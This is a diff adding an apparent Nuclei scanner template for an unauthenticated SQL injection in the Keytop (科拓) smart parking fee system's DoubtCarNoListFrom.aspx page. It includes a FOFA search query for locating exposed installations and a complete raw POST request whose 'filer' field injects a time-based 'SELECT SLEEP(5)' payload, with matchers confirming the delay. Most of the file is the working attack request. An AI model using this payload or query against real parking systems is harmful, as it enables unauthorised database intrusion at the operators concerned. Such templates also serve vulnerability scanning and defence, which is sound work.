@@ -1,0 +1,35 @@
+id: ketuo-doubtcarnolistfrom-sqli
+
+info:
+  name: 科拓全智能停车收费系统DoubtCarNoListFrom.aspxSQL注入漏洞
+  author: Simple
+  severity: high
+  description: |
+    科拓全智能停车收费系统DoubtCarNoListFrom.aspx存在SQL注入漏洞，未经身份验证的恶意攻击者利用 SQL 注入漏洞获取数据库中的信息。
+  reference:
+    - https://github.com/JJThome
+  metadata:
+    fofa-query: body="/KT_Css/qd_defaul.css"
+  tags: 科拓全智能停车收费系统
+
+http:
+  - raw:
+      - |
+        POST /KT_Admin/CarCard/DoubtCarNoListFrom.aspx HTTP/1.1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Connection: close
+        Host: {{Hostname}}
+        Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
+        Content-Type: application/x-www-form-urlencoded
+
+        start=0&limit=20&filer=1;SELECT SLEEP(5)#
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - duration>=5
+          - contains(body, "totalCount")
+        condition: and
